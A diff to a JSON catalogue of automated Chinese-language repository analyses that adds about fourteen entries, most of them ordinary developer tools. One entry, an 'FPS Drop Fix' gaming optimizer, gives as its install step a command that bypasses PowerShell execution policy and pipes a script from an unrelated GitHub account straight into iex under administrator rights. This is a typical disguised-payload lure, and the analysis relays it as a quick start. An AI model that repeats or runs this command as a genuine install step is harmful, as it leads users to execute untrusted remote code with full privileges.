@@ -1,6 +1,6 @@
 {
   "version": "1",
-  "updatedAt": "2026-06-17T06:41:30.743Z",
+  "updatedAt": "2026-06-18T06:26:27.810Z",
   "projects": [
     {
       "owner": "codecrafters-io",
@@ -50533,6 +50533,698 @@
         "category": "测试工具"
       },
       "analyzedAt": "2026-06-17T06:41:30.722Z"
+    },
+    {
+      "owner": "LoopBureaucrat",
+      "repo": "FPS-Drop-Fix-PowerShell",
+      "fullName": "LoopBureaucrat/FPS-Drop-Fix-PowerShell",
+      "description": "Install FPS Drop Fix via PowerShell — one-command gaming optimizer for Windows 10/11. Fix stuttering, FPS drops, input lag. Valorant, Fortnite, CS2, Apex, Rust.",
+      "language": "Unknown",
+      "topics": [
+        "fix",
+        "fortnite",
+        "fps",
+        "fps-drop",
+        "game",
+        "gaming",
+        "gpu",
+        "input-lag",
+        "low-latency",
+        "optimizer",
+        "performance",
+        "stuttering",
+        "tool",
+        "valorant",
+        "windows",
+        "windows-10",
+        "windows-11"
+      ],
+      "license": "NOASSERTION",
+      "createdAt": "2026-06-18T03:59:50Z",
+      "url": "https://github.com/LoopBureaucrat/FPS-Drop-Fix-PowerShell",
+      "analysis": {
+        "positioning": "Windows游戏一键优化工具，修复卡顿掉帧和输入延迟。",
+        "useCases": [
+          "你玩CS2/Valorant等游戏遇到微卡顿 → 它帮你优化计时器分辨率，消除微卡顿。",
+          "你玩游戏FPS不稳定或掉帧 → 它帮你切换到终极性能电源计划，并禁用游戏录像，提升稳定性。",
+          "你玩游戏有输入延迟感 → 它帮你优化GPU设置，开启低延迟模式，减少延迟。"
+        ],
+        "audience": "Windows 10/11游戏玩家，希望通过简单操作提升游戏帧率和流畅度。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 (64位)，PowerShell 5.1+，管理员权限，网络连接。",
+          "steps": [
+            "以管理员身份打开PowerShell (Win + X → 终端管理员)。",
+            "粘贴并运行以下命令块，然后按Enter：Set-ExecutionPolicy Bypass -Scope Process -Force; irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex",
+            "根据提示输入许可证密钥并完成设置。"
+          ],
+          "note": "安装完成后可能需要重启；如果执行受阻，再次运行Set-ExecutionPolicy Bypass -Scope Process -Force。"
+        },
+        "competitors": [],
+        "pricing": "付费，需要许可证密钥。",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "通过一键PowerShell脚本解决特定游戏性能问题，但安装方式涉及绕过执行策略、从外部源下载脚本，并要求许可证密钥，结合其低星数和基本系统优化内容，偏向快速解决而非标准工程实践。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度低，无Issue反馈。",
+        "category": "CLI工具"
+      },
+      "analyzedAt": "2026-06-18T06:22:47.876Z"
+    },
+    {
+      "owner": "vercel",
+      "repo": "eve",
+      "fullName": "vercel/eve",
+      "description": "The Framework for Building Agents",
+      "language": "TypeScript",
+      "topics": [
+        "agent",
+        "framework",
+        "harness",
+        "javascript",
+        "markdown",
+        "sandbox",
+        "typescript",
+        "vercel",
+        "workflows"
+      ],
+      "license": "Apache-2.0",
+      "createdAt": "2026-06-16T10:51:20Z",
+      "url": "https://github.com/vercel/eve",
+      "analysis": {
+        "positioning": "Vercel出品，文件系统优先的AI Agent框架",
+        "useCases": [
+          "你想构建可扩展的AI Agent → 它帮你通过文件系统组织Agent的核心能力（如工具、技能、指令），实现项目易于检查、扩展和操作。",
+          "你想定制AI Agent的交互行为 → 它帮你通过`channels`配置消息通道（HTTP, Slack, Discord），实现与外部系统的无缝通信。",
+          "你想让AI Agent具备复杂逻辑或外部调用能力 → 它帮你通过`tools`定义可供模型调用的函数，通过`skills`定义按需加载的流程，增强Agent能力。",
+          "你想让AI Agent定时自动执行任务 → 它帮你通过`schedules`设置周期性的Cron作业，实现自动化工作流。"
+        ],
+        "audience": "希望快速构建、部署和管理耐用AI Agent的TypeScript开发者，尤其适合需要Agent持久化、可扩展和易于调试的场景。",
+        "quickStart": {
+          "prerequisites": "Node.js (隐式)",
+          "steps": [
+            "运行 `npx eve@latest init <project-name>` 创建新Agent项目并启动交互式终端UI。",
+            "根据需求修改 `agent/instructions.md` 定义系统提示，并在 `agent/tools/` 添加自定义工具。"
+          ],
+          "note": "`eve` 包自带完整文档，开发Agent可本地读取学习。"
+        },
+        "competitors": [
+          {
+            "name": "LangChain",
+            "method": "模块化Python/JS库，链式调用，提供Agent、Prompt模板、工具等抽象。",
+            "models": "广泛支持各类LLM和向量数据库。",
+            "pricing": "开源免费"
+          },
+          {
+            "name": "LlamaIndex",
+            "method": "数据框架，专注于将LLM与外部数据连接、索引和查询，构建RAG应用。",
+            "models": "广泛支持各类LLM和数据源。",
+            "pricing": "开源免费"
+          }
+        ],
+        "pricing": "开源免费 (Apache-2.0 License)",
+        "vibeCodingScore": 5,
+        "vibeCodingReason": "Vercel出品，采用TypeScript，强调文件系统优先的直观设计，快速启动和高度可扩展性，开发体验流畅且现代化。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue开启数量（21）远超关闭数量（3），项目处于早期活跃反馈收集阶段，Issue解决速度有待观察。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-06-18T06:23:07.822Z"
+    },
+    {
+      "owner": "vorssaint",
+      "repo": "vorssaint-utils",
+      "fullName": "vorssaint/vorssaint-utils",
+      "description": "Vorssaint macOS app",
+      "language": "Swift",
+      "topics": [],
+      "license": "GPL-3.0",
+      "createdAt": "2026-06-12T15:25:43Z",
+      "url": "https://github.com/vorssaint/vorssaint-utils",
+      "analysis": {
+        "positioning": "macOS多功能系统工具集，告别付费应用捆绑。",
+        "useCases": [
+          "你需要Mac保持唤醒 → 它帮你一键或定时保持唤醒。",
+          "你想知道哪个应用拖慢Mac → 它帮你实时监控系统资源占用。",
+          "你想单独调节某个应用音量 → 它帮你实现应用级别音量控制。"
+        ],
+        "audience": "寻求免费、高效、本地化替代方案的Mac用户，厌倦为各种小功能购买独立工具。",
+        "quickStart": {
+          "prerequisites": "macOS 14+ (Apple Silicon)",
+          "steps": [
+            "打开终端，运行 `brew install --cask vorssaint/tap/vorssaint`。",
+            "或直接从GitHub Releases页面下载 .dmg 安装包。"
+          ],
+          "note": null
+        },
+        "competitors": [
+          {
+            "name": "iStat Menus",
+            "method": "付费安装，常驻菜单栏",
+            "models": "N/A (系统监控)",
+            "pricing": "付费"
+          },
+          {
+            "name": "SoundSource",
+            "method": "付费安装，音频控制应用",
+            "models": "N/A (应用音量控制)",
+            "pricing": "付费"
+          }
+        ],
+        "pricing": "完全免费，无订阅。",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "作为一款macOS实用工具，它主打免费、开源、本地化，无账户、无订阅、无遥测，不使用Electron，原生SwiftUI + AppKit开发，保持小巧快速。这些特性完美契合了追求效率、隐私和原生体验的开发者偏好。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度高，已关闭Issue远多于开放Issue（5:32），表明项目维护积极，问题响应迅速。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-06-18T06:23:23.908Z"
+    },
+    {
+      "owner": "SunJaycy",
+      "repo": "GoldenEye-Recomp",
+      "fullName": "SunJaycy/GoldenEye-Recomp",
+      "description": "",
+      "language": "C",
+      "topics": [],
+      "license": "Unlicense",
+      "createdAt": "2026-06-12T16:07:27Z",
+      "url": "https://github.com/SunJaycy/GoldenEye-Recomp",
+      "analysis": {
+        "positioning": "《黄金眼007》Xbox 360版PC原生重编译移植。",
+        "useCases": [
+          "你想在PC上玩《黄金眼007》Xbox版 → 它提供原生PC运行，告别模拟器卡顿。",
+          "你想和朋友联机玩《黄金眼007》→ 它支持在线多人对战，无需复杂设置。",
+          "你想自定义游戏画面或联机设置 → 它提供丰富的内置菜单选项，即时调整。"
+        ],
+        "audience": "怀旧《黄金眼007》Xbox版的老玩家、PC游戏爱好者及希望能联机和修改的开发者。",
+        "quickStart": {
+          "prerequisites": "拥有《黄金眼007》XBLA版游戏文件。",
+          "steps": [
+            "下载最新预编译版本",
+            "将游戏文件放入 `assets/` 文件夹",
+            "运行 `ge.exe`"
+          ],
+          "note": null
+        },
+        "competitors": [
+          {
+            "name": "Xenia (Xbox 360模拟器)",
+            "method": "通过模拟器运行",
+            "models": "模拟Xbox 360游戏",
+            "pricing": "免费"
+          }
+        ],
+        "pricing": "免费",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "项目目标明确，文档详细，提供预编译版和源码构建指南，活跃的Issue处理（50已关闭），显示了维护者的投入和项目的成熟度。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃，关闭Issue数远超开启数，问题解决效率高。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-06-18T06:23:37.182Z"
+    },
+    {
+      "owner": "fguzman82",
+      "repo": "gateGPT",
+      "fullName": "fguzman82/gateGPT",
+      "description": "Full Transformer into a custom chip. microGPT in RTL, generating names on a Virtex-5 FPGA at ~56k tokens/second.",
+      "language": "Verilog",
+      "topics": [],
+      "license": "Unknown",
+      "createdAt": "2026-06-12T14:55:53Z",
+      "url": "https://github.com/fguzman82/gateGPT",
+      "analysis": {
+        "positioning": "在FPGA上实现微型Transformer，超高速字符生成。",
+        "useCases": [
+          "你希望在FPGA上直接运行AI模型推理 → 它帮你将小型GPT模型部署到特定硬件，实现超高效字符生成。",
+          "你需要极致低延迟和高能效的字符级文本生成方案 → 它在老旧FPGA上达到每秒50k token的生成速度。",
+          "你正在研究AI模型硬件加速的具体实现和性能优化 → 它提供了一个完整的、可运行的Transformer RTL设计和架构参考。"
+        ],
+        "audience": "硬件工程师、FPGA开发者、AI芯片设计者，以及对AI模型超低功耗、高性能硬件加速感兴趣的开发者和研究人员。",
+        "quickStart": {
+          "prerequisites": "具备Xilinx Virtex-5 FPGA开发板 (XC5VLX110T, XUPV5 / ML509), Xilinx ISE 14.7开发环境，并熟悉Verilog。",
+          "steps": [
+            "获取指定型号的Xilinx Virtex-5 FPGA开发板并配置ISE 14.7开发环境。",
+            "克隆fguzman82/gateGPT代码仓库。",
+            "使用Verilog RTL代码进行综合、布局布线，并生成FPGA比特流。",
+            "将比特流烧录到FPGA板上，观察LCD显示屏上的名称生成。"
+          ],
+          "note": "项目针对特定型号的旧版Xilinx FPGA和开发工具，不适用于通用CPU/GPU平台。"
+        },
+        "competitors": [
+          {
+            "name": "Hugging Face Transformers",
+            "method": "Python软件库，运行于通用GPU/CPU",
+            "models": "支持各类开源Transformer模型",
+            "pricing": "免费（开源库）"
+          },
+          {
+            "name": "llama.cpp",
+            "method": "C/C++软件库，轻量级模型运行于CPU/GPU",
+            "models": "主要支持Llama系列轻量级LLM",
+            "pricing": "免费（开源库）"
+          },
+          {
+            "name": "云端LLM服务 (如OpenAI API)",
+            "method": "通过API调用远程大型AI模型",
+            "models": "最新、最强大的商业LLM",
+            "pricing": "按量付费"
+          }
+        ],
+        "pricing": "免费 (开源Verilog代码和设计)",
+        "vibeCodingScore": 5,
+        "vibeCodingReason": "这是一个高度创新和硬核的AI硬件加速项目。它在一个相对老旧的FPGA上，以出色的性能（50k tokens/秒）完整实现了Transformer模型，并提供了详细的硬件架构和性能优化。从RTL设计到微码指令集，再到固定点规范，全部独立完成，技术深度和实现难度极高，充分展现了Vibe Coding精神。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度较低，Issue统计显示目前没有开放或关闭的Issue。这可能表明项目相对独立、完善，或处于早期阶段。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-06-18T06:24:00.362Z"
+    },
+    {
+      "owner": "royalbhati",
+      "repo": "sqltoerdiagram",
+      "fullName": "royalbhati/sqltoerdiagram",
+      "description": "ER diagram generator. Paste CREATE TABLE statements and get a clean, interactive ERD — runs 100% in your browser, nothing uploaded",
+      "language": "JavaScript",
+      "topics": [
+        "data-modeling",
+        "database",
+        "database-schema",
+        "dbdiagram",
+        "dbml",
+        "developer-tools",
+        "diagram",
+        "entity-relationship-diagram",
+        "er-diagram",
+        "erd",
+        "mysql",
+        "open-source",
+        "postgresql",
+        "schema",
+        "sql",
+        "sql-parser",
+        "sqlite",
+        "vanilla-js",
+        "visualization",
+        "vite"
+      ],
+      "license": "Unknown",
+      "createdAt": "2026-06-14T04:12:26Z",
+      "url": "https://github.com/royalbhati/sqltoerdiagram",
+      "analysis": {
+        "positioning": "基于SQL语句生成交互式ER图，100%浏览器内离线运行。",
+        "useCases": [
+          "你希望可视化现有数据库结构 → 它帮你粘贴SQL快速生成可交互的ER图。",
+          "你正在设计或修改数据库Schema → 它帮你直接在ER图上编辑表、列，SQL代码自动同步更新。",
+          "你需要分享或保存数据库设计方案 → 它帮你生成可分享链接或保存为项目文件，且支持多种导出和标注。"
+        ],
+        "audience": "需要快速可视化、设计或修改数据库ER图的开发者、DBA和架构师。",
+        "quickStart": {
+          "prerequisites": null,
+          "steps": [
+            "访问在线地址 https://sqltoerdiagram.com",
+            "粘贴 CREATE TABLE 或 ALTER TABLE SQL语句",
+            "立即获得干净、交互式的ER图"
+          ],
+          "note": "所有操作均在浏览器本地完成，无需上传任何数据，确保隐私安全。"
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "功能强大、交互流畅，支持多种SQL方言。100%本地运行保证数据安全，且开源免费。画布编辑、布局保存、链接分享、标注等细节考虑周全，显著提升了数据库设计的效率和体验。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度一般，Issue数量不多，但有处理和关闭的记录。",
+        "category": "数据库"
+      },
+      "analyzedAt": "2026-06-18T06:24:14.588Z"
+    },
+    {
+      "owner": "fivetaku",
+      "repo": "fablize",
+      "fullName": "fivetaku/fablize",
+      "description": "A Claude Code plugin that makes Opus behave like Fable — completion, evidence, and verification enforced as procedure. Ships only what a Fable-vs-Opus comparison proved transferable.",
+      "language": "Shell",
+      "topics": [
+        "agentic",
+        "anthropic",
+        "claude",
+        "claude-code",
+        "fable",
+        "harness",
+        "opus"
+      ],
+      "license": "Unknown",
+      "createdAt": "2026-06-14T05:49:06Z",
+      "url": "https://github.com/fivetaku/fablize",
+      "analysis": {
+        "positioning": "提升Claude模型代码任务执行的可靠性和完整性",
+        "useCases": [
+          "你让Claude生成代码、构建工件 → 它会强制执行运行和观察验证，确保产物可用。",
+          "你给Claude复杂的多步骤任务 → 它会分解任务，设置证据门槛，拒绝没有验证结果的“完成”。",
+          "Claude在执行任务中遇到问题 → 它会遵循系统性调查协议（重现、假设、因果链）来解决。"
+        ],
+        "audience": "使用Claude模型（如Opus）进行编程、逻辑或构建任务，追求代码产物可靠性、任务执行严谨性和完整性的开发者。",
+        "quickStart": {
+          "prerequisites": "需有Anthropic Claude模型（如Opus）的访问权限。",
+          "steps": [
+            "理解fablize定义的程序规范和工作流。",
+            "根据项目说明，将这些经过验证的程序性约束和行为集成到你的Claude模型交互或Agent设计中。"
+          ],
+          "note": null
+        },
+        "competitors": [],
+        "pricing": "免费（基于MIT许可证）。",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "项目基于严谨的实验对比，明确界定模型能力与可迁移程序，专注于通过强化验证、分步完成和系统性调查等流程，显著提升Claude模型在代码和逻辑任务中的可靠性和结果完整性，不追求不可实现的能力突破，务实且高效。",
+        "isVibeCoding": true,
+        "communityActivity": "目前Issue统计为0开0闭，社区活跃度较低。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-06-18T06:24:31.517Z"
+    },
+    {
+      "owner": "NO6KIKO",
+      "repo": "gorest-2d-animation-spritesheet-generator",
+      "fullName": "NO6KIKO/gorest-2d-animation-spritesheet-generator",
+      "description": "Codex-assisted local 2D animation spritesheet generator and scene compositing workspace.",
+      "language": "TypeScript",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-06-12T00:46:23Z",
+      "url": "https://github.com/NO6KIKO/gorest-2d-animation-spritesheet-generator",
+      "analysis": {
+        "positioning": "Codex辅助的本地2D游戏动画工作台，快速生成精灵图、搭建场景。",
+        "useCases": [
+          "你想快速原型2D游戏动画 → 它帮你用AI提示词生成精灵图，并即时预览。",
+          "你想搭建侧滚2D游戏场景 → 它帮你拖拽放置角色、道具和背景，实时合成。",
+          "你想管理和调整动画精灵图参数 → 它帮你编辑元数据、触发设置、循环模式，无需离开场景。"
+        ],
+        "audience": "2D游戏开发者、独立游戏制作人、动画师，用于早期游戏原型和迭代动画设计。",
+        "quickStart": {
+          "prerequisites": "Node.js 20或更高版本",
+          "steps": [
+            "git clone https://github.com/NO6KIKO/gorest-2d-animation-spritesheet-generator.git",
+            "cd gorest-2d-animation-spritesheet-generator",
+            "npm install"
+          ],
+          "note": "目前本地使用无需API key，未来若启用云端图像生成可能需要。"
+        },
+        "competitors": [
+          {
+            "name": "Spine",
+            "method": "专业2D骨骼动画软件，通过手动设置骨骼和关键帧制作动画",
+            "models": "不适用",
+            "pricing": "付费"
+          }
+        ],
+        "pricing": "免费",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "项目核心理念就是通过AI（Codex）提示词驱动，跳过传统手动流程，快速迭代生成动画精灵图和场景，高度依赖直觉和AI辅助。",
+        "isVibeCoding": true,
+        "communityActivity": "刚起步或尚未形成活跃社区，Issue统计显示无活动。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-06-18T06:24:43.333Z"
+    },
+    {
+      "owner": "Waishnav",
+      "repo": "devspace",
+      "fullName": "Waishnav/devspace",
+      "description": "Turn ChatGPT into Codex",
+      "language": "TypeScript",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-06-14T16:57:27Z",
+      "url": "https://github.com/Waishnav/devspace",
+      "analysis": {
+        "positioning": "将ChatGPT变为本地编程助手，安全读写执行代码。",
+        "useCases": [
+          "你写代码 → ChatGPT直接在本地项目修改、测试、提交，无需上传。",
+          "你想了解项目 → ChatGPT帮你搜索代码、检查目录、运行脚本，实时反馈。",
+          "你需调试 → ChatGPT运行命令并展示更改，通过Git worktrees隔离会话。"
+        ],
+        "audience": "希望ChatGPT安全接入本地项目、辅助编程的开发者，无需上传代码。",
+        "quickStart": {
+          "prerequisites": "Node >=20.12 <27 (推荐Node 22 LTS)",
+          "steps": [
+            "全局安装CLI: `npm install -g @waishnav/devspace`",
+            "初始化并启动服务: `devspace init` && `devspace serve`",
+            "配置项目路径、本地端口、公共HTTPS隧道URL，并输入Owner密码以连接。"
+          ],
+          "note": "需通过Cloudflare Tunnel、ngrok等反向代理将本地服务暴露给ChatGPT，并设置Owner密码保证安全。"
+        },
+        "competitors": [],
+        "pricing": "免费（MIT License，开源项目）",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "将ChatGPT能力安全带入本地开发环境，实现类似Codex的本地代码交互和执行，私密性强，实用性高。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue开启2个，关闭0个，项目非常早期或活跃度较低。",
+        "category": "AI编程助手"
+      },
+      "analyzedAt": "2026-06-18T06:24:56.753Z"
+    },
+    {
+      "owner": "Nanako0129",
+      "repo": "coralline",
+      "fullName": "Nanako0129/coralline",
+      "description": "🪸 Powerlevel10k-inspired statusline for Claude Code — paste one prompt and your AI interviews you, then installs it",
+      "language": "Shell",
+      "topics": [
+        "bash",
+        "claude",
+        "claude-code",
+        "nerd-fonts",
+        "powerlevel10k",
+        "statusline",
+        "terminal",
+        "vibe-coding"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-06-12T07:44:56Z",
+      "url": "https://github.com/Nanako0129/coralline",
+      "analysis": {
+        "positioning": "AI辅助安装的Claude Code终端状态栏美化工具。",
+        "useCases": [
+          "你想要美观高效的Claude Code终端状态栏 → 它帮你通过AI快速配置并显示丰富会话信息。",
+          "你不懂或不想手动配置终端 → 它通过Claude AI互动式引导，自动完成安装和个性化设置。",
+          "你需要在Claude Code中实时监控会话成本、令牌使用和速率限制 → 它在状态栏直观展示这些关键数据，并提供预警。"
+        ],
+        "audience": "Claude Code用户，尤其是追求高效、美观，并希望利用AI便捷配置终端环境的开发者。",
+        "quickStart": {
+          "prerequisites": "需要jq和Nerd Font，或设置VL_ASCII=1。",
+          "steps": [
+            "将项目README中提供的安装命令粘贴到Claude Code中。",
+            "回答AI提出的关于主题、布局和组件的几个问题，完成自动配置。"
+          ],
+          "note": "macOS和Linux完全支持，Windows+Git Bash支持。"
+        },
+        "competitors": [
+          {
+            "name": "Powerlevel10k",
+            "method": "Zsh/Bash shell脚本手动配置",
+            "models": "N/A",
+            "pricing": "免费"
+          },
+          {
+            "name": "Claude Code原生状态栏配置",
+            "method": "手动编辑~/.claude/settings.json",
+            "models": "N/A",
+            "pricing": "免费"
+          }
+        ],
+        "pricing": "免费，开源项目。",
+        "vibeCodingScore": 5,
+        "vibeCodingReason": "高度关注终端美学和用户体验，提供Powerlevel10k风格状态栏、多主题选择和丰富的自定义功能，直接提升编码‘氛围感’。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue关闭率高 (80%)，当前仅1个开启Issue，活跃度良好。",
+        "category": "CLI工具"
+      },
+      "analyzedAt": "2026-06-18T06:25:12.544Z"
+    },
+    {
+      "owner": "buynao",
+      "repo": "aipath",
+      "fullName": "buynao/aipath",
+      "description": "Interactive AI General Education Course — 30 Lessons, Zero Math",
+      "language": "JavaScript",
+      "topics": [
+        "ai",
+        "machine-learning"
+      ],
+      "license": "Unknown",
+      "createdAt": "2026-06-12T10:58:35Z",
+      "url": "https://github.com/buynao/aipath",
+      "analysis": {
+        "positioning": "零数学、交互式AI通识课，助你从小白到AI应用构建者。",
+        "useCases": [
+          "你渴望理解AI核心概念 → 它通过直观可视化和交互式Demo，让你轻松掌握复杂原理。",
+          "你厌倦了堆砌公式的AI课程 → 它提供零数学、场景驱动的讲解，大大降低学习门槛。",
+          "你想亲手实践AI应用 → 它引导你编写代码，从调用LLM API到构建RAG知识库。"
+        ],
+        "audience": "适合想从零开始、无数学背景、快速掌握AI核心概念并亲手实践AI应用开发的初学者。",
+        "quickStart": {
+          "prerequisites": null,
+          "steps": [
+            "访问官网 `aipath.buynao.com`",
+            "选择语言（中文/English）并开始学习任一课程"
+          ],
+          "note": null
+        },
+        "competitors": [
+          {
+            "name": "传统在线AI课程平台 (如Coursera/DeepLearning.AI)",
+            "method": "视频教学、理论讲解、作业练习",
+            "models": "广泛，涵盖各种AI模型",
+            "pricing": "部分免费/付费"
+          }
+        ],
+        "pricing": "免费",
+        "vibeCodingScore": 5,
+        "vibeCodingReason": "项目内容、交互Demo及前端代码均由Claude Fable生成，是端到端的AI代码创作范例。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度极低，Issue区无任何公开讨论或维护记录。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-06-18T06:25:45.086Z"
+    },
+    {
+      "owner": "rebel0789",
+      "repo": "codexpro",
+      "fullName": "rebel0789/codexpro",
+      "description": "Use ChatGPT Developer Mode as a local coding agent for your repo through MCP.",
+      "language": "JavaScript",
+      "topics": [
+        "apps-sdk",
+        "chatgpt",
+        "cloudflare-tunnel",
+        "codex",
+        "local-development",
+        "mcp",
+        "ngrok"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-06-16T21:22:43Z",
+      "url": "https://github.com/rebel0789/codexpro",
+      "analysis": {
+        "positioning": "让ChatGPT变成本地代码代理，理解并操作你的代码库。",
+        "useCases": [
+          "你希望ChatGPT理解你的本地代码库上下文 → 它帮你将代码、git状态等信息实时同步给ChatGPT。",
+          "你想让ChatGPT直接修改本地文件或执行命令 → 它让ChatGPT可以直接读写文件、进行精确修改和执行安全验证命令。",
+          "你需要ChatGPT进行高层规划，但不直接执行 → 它能让ChatGPT生成执行计划（`.ai-bridge/current-plan.md`），供其他本地Agent实现。"
+        ],
+        "audience": "希望利用ChatGPT官方开发者模式，使其作为本地AI编程助手直接参与代码开发和维护的开发者。",
+        "quickStart": {
+          "prerequisites": "Node.js、npm，以及开通ChatGPT开发者模式的账号",
+          "steps": [
+            "`npm install -g codexpro`",
+            "`codexpro setup`",
+            "将生成的服务器URL粘贴到ChatGPT Create App中"
+          ],
+          "note": null
+        },
+        "competitors": [],
+        "pricing": "免费（工具本身开源），但依赖的ChatGPT服务可能需付费订阅。",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "它直接赋予ChatGPT在本地代码库中读写文件、修改代码和执行验证命令的能力，是实现AI辅助编码的强大工具。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue活跃度一般，目前无未解决问题，已关闭4个。",
+        "category": "AI编程助手"
+      },
+      "analyzedAt": "2026-06-18T06:26:01.540Z"
+    },
+    {
+      "owner": "eli-labz",
+      "repo": "Third-Eye",
+      "fullName": "eli-labz/Third-Eye",
+      "description": "A production-grade OSINT platform that provides situational awareness across multiple intelligence domains.",
+      "language": "TypeScript",
+      "topics": [
+        "ai",
+        "ai-agent",
+        "geospatial",
+        "maven-smart-system",
+        "palantir"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-06-13T03:15:46Z",
+      "url": "https://github.com/eli-labz/Third-Eye",
+      "analysis": {
+        "positioning": "生产级OSINT平台，提供多领域实时态势感知与情报侦察。",
+        "useCases": [
+          "你需实时掌握全球飞行、海运、CCTV、地震等动态 → 它帮你整合16+实时数据层，在GPU加速地图上实现态势感知。",
+          "你想快速分析特定IP、域名、加密钱包或实体信息 → 它提供内置工具集，助你进行端口扫描、WHOIS查询、加密货币追踪及制裁名单核查。",
+          "你负责监控冲突区域、突发新闻或敏感情报 → 它将实时新闻、冲突区数据及Telegram OSINT地理解析后呈现在地图上。"
+        ],
+        "audience": "需要全球开源情报（OSINT）收集、分析及实时态势感知的安全分析师、情报专家、研究人员及记者。",
+        "quickStart": {
+          "prerequisites": null,
+          "steps": [
+            "克隆项目仓库",
+            "运行启动命令（如`npm install`后`npm run dev`或Docker启动）"
+          ],
+          "note": "支持Docker一键部署，提供CasaOS一键安装。"
+        },
+        "competitors": [],
+        "pricing": "免费 (MIT开源许可，核心功能无需API Key)",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "项目定位明确，是生产级的OSINT平台，提供多达16个实时数据层和内置侦察工具。强调GPU加速和零API Key启动，技术栈现代。文档清晰，支持Docker部署，上手门槛低。",
+        "isVibeCoding": true,
+        "communityActivity": "项目尚处于早期，Star数近300，但Issue活跃度较低（1/0），有待观察。",
+        "category": "安全"
+      },
+      "analyzedAt": "2026-06-18T06:26:14.783Z"
+    },
+    {
+      "owner": "dongshuyan",
+      "repo": "compass-skills",
+      "fullName": "dongshuyan/compass-skills",
+      "description": "司南：个性化 AI 任务总控 Skills 系统 /COMPASS: Personal Alignment Skills OS for AI Agents",
+      "language": "Python",
+      "topics": [
+        "agent-memory",
+        "agent-skills",
+        "ai-agents",
+        "ai-coding-agent",
+        "claude-code",
+        "claude-skills",
+        "codex-skills",
+        "developer-tools",
+        "local-first",
+        "openai-codex",
+        "personal-ai",
+        "prompt-engineering",
+        "skill-md",
+        "task-management",
+        "workflow-automation"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-06-15T06:28:04Z",
+      "url": "https://github.com/dongshuyan/compass-skills",
+      "analysis": {
+        "positioning": "为AI Agent提供任务管理与上下文维持能力的技能系统。",
+        "useCases": [
+          "你让AI Agent执行复杂、模糊任务 → 它帮你澄清目标、范围和风险，确保AI Agent理解一致。",
+          "你让AI Agent执行长期、多步骤项目 → 它帮你构建任务图、记录进度和决策，跨会话保持上下文。",
+          "你希望AI Agent更好地理解你的协作偏好和风格 → 它帮你维护个性化用户画像，提升沟通效率。"
+        ],
+        "audience": "需要提升AI Agent长期任务管理、上下文理解和个性化协作能力的开发者和AI Agent用户。",
+        "quickStart": {
+          "prerequisites": "Node.js环境 (npm/npx)",
+          "steps": [
+            "使用 `npx skills add dongshuyan/compass-skills --list` 查看可用技能。",
+            "通过 `npx skills add dongshuyan/compass-skills --skill '*' -a your-agent` （例如`claude-code`）安装技能。",
+            "在Agent会话中，通过 `$skill-name`（例如`$task-clarifier`）直接调用技能。"
+          ],
+          "note": "支持手动复制技能文件进行安装，兼容性更广。"
+        },
+        "competitors": [],
+        "pricing": "免费 (MIT License)",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "通过 `npx` 命令安装和管理技能体验良好，技能调用方式直观简洁，并提供了详细的教程。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue开启0个，关闭0个，社区活跃度较低，可能处于早期阶段。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-06-18T06:26:27.791Z"
     }
   ]
 }
